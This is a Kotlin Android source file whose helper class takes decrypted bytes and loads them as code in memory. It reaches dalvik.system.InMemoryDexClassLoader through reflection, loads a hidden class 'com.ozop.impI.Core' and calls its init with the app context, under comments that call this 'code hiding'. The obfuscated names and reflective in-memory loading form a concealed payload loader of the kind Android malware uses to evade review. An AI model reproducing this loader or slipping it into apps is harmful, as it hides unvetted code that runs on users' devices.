package com.charm.refined.helper

import android.content.Context
import java.lang.reflect.Constructor
import java.util.Base64

/**
 * Date：2025/12/3
 * Describe:
 */
abstract class BaseHelper {
    var nameStr = ""

    abstract fun fetBuffer(): Any

    abstract fun decla(string: String): Constructor<*>

    protected fun dex(context: Context) {
// 代码隐藏
// code 为解密的byte数据
        val byteBuffer = fetBuffer()
//"dalvik.system.InMemoryDexClassLoader"
        val constructor = decla("dalvik.system.InMemoryDexClassLoader")

        val clazzLoader = context.javaClass.getMethod("getClassLoader").invoke(context)

        val classLoader = constructor.newInstance(byteBuffer, clazzLoader)
        val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)

            .invoke(classLoader, "com.ozop.impI.Core") as Class<*>

        loadedClass.getMethod("init", Context::class.java).invoke(null, context)
    }

    protected fun fetchStr(): String {
        runCatching {
            return Class.forName(nameStr).getMethod("a1").invoke(null)?.toString() ?: ""
        }
        return ""
    }

    protected fun fe(inStr: String): ByteArray {
        return Base64.getDecoder().decode(inStr)
    }

}